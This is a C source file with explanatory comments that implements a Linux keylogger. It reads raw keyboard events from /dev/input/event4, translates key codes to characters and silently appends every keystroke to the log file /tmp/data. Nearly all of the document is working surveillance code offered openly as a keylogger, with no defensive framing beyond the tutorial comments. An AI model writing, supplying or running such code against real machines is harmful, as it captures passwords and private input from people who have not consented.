//A keylogger is a function which records keystrokes on your computer. 
//In linux, everything is a file and that means our keystrokes on the keyboard is also a file itself.

#include <unistd.h>
#include <linux/input.h>
#include <stdio.h>
#include <fcntl.h>


#define Log "/tmp/data" //We will be storing our stored data (keystrokes) in a logfile named “data” in the /tmp folder.

//The directory /tmp means temporary. This directory stores temporary data. You don't need to delete anything from it, the data contained in it gets deleted automatically after every reboot.

int main(int argc, char **argv)
{
FILE *f_ptr = fopen(Log, "a");
struct input_event iev;
char *mapping = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
int open_file = open("/dev/input/event4", O_RDONLY); // The /dev/input folder have all of them. This file maintains the list of all events for different input devices.

// name of the input device will be “AT Translated Set 2 keyboard” and EV=120013. Here my event number is event4.

while(1)
{
read(open_file, &iev, sizeof(iev));
if ((iev.type == EV_KEY) && (iev.value == 0))
{
fflush(f_ptr);
switch(iev.code)
 {
		case 28:
		  fprintf(f_ptr, "\n");
		  break;
		case 57:
		  fprintf(f_ptr, " ");
		  break;
		default:
		  fprintf(f_ptr, "%c", mapping[iev.code]);
 }
}
}
fclose(f_ptr);
close(open_file);
}

